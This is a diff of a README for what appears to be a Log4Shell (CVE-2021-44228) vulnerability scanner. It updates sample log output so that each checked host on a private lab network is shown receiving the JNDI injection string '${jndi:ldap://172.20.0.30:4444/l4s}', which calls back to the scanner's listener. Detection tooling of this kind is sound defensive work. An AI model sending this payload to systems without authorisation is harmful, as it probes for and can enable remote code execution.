@@ -96,27 +96,27 @@ Global Flags:
 ```bash
 make run-remote
 
-scanner_1  | 2021/12/15 22:28:57 [i] Log4Shell CVE-2021-44228 Remote Vulnerability Scan
-scanner_1  | 2021/12/15 22:28:57 [i] Listening on 172.20.0.30:4444
-scanner_1  | 2021/12/15 22:28:57 [i] Start scanning CIDR 172.20.0.0/24
+scanner_1  | 2021/12/16 09:57:24 [i] Log4Shell CVE-2021-44228 Remote Vulnerability Scan
+scanner_1  | 2021/12/16 09:57:24 [i] Listening on 172.20.0.30:4444
+scanner_1  | 2021/12/16 09:57:24 [i] Start scanning CIDR 172.20.0.0/24
 scanner_1  | ---------
-scanner_1  | 2021/12/14 06:20:06 [i] Checking http://172.20.0.0:8080
-scanner_1  | 2021/12/14 06:20:06 [i] Checking http://172.20.0.1:8080
-scanner_1  | 2021/12/14 06:20:06 [i] Checking http://172.20.0.2:8080
-scanner_1  | 2021/12/14 06:20:06 [i] Checking http://172.20.0.3:8080
-scanner_1  | 2021/12/14 06:20:06 [i] Checking http://172.20.0.4:8080
-scanner_1  | 2021/12/14 06:20:06 [i] Checking http://172.20.0.5:8080
-scanner_1  | 2021/12/14 06:20:06 [i] Checking http://172.20.0.6:8080
-scanner_1  | 2021/12/14 06:20:06 [i] Checking http://172.20.0.7:8080
-scanner_1  | 2021/12/14 06:20:06 [i] Checking http://172.20.0.8:8080
-scanner_1  | 2021/12/14 06:20:06 [i] Checking http://172.20.0.9:8080
-scanner_1  | 2021/12/14 06:20:07 [i] Checking http://172.20.0.10:8080
-scanner_1  | 2021/12/14 06:20:07 [i] Checking http://172.20.0.11:8080
-scanner_1  | 2021/12/14 06:20:07 [i] Checking http://172.20.0.12:8080
-scanner_1  | 2021/12/14 06:20:07 [i] Checking http://172.20.0.13:8080
-scanner_1  | 2021/12/14 06:20:07 [i] Checking http://172.20.0.14:8080
-scanner_1  | 2021/12/14 06:20:07 [i] Checking http://172.20.0.15:8080
-scanner_1  | 2021/12/14 06:20:07 [!] Possibly vulnerable host identified: 172.20.0.15:45948
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.0:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.1:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.2:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.3:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.4:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.5:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.6:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.7:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.8:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.9:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.10:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.11:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.12:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.13:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.14:8080
+scanner_1  | 2021/12/16 09:57:24 [i] Checking ${jndi:ldap://172.20.0.30:4444/l4s} http://172.20.0.15:8080
+scanner_1  | 2021/12/16 09:57:24 [!] Possibly vulnerable host identified: 172.20.0.13:60614
 ```
 
 ## References
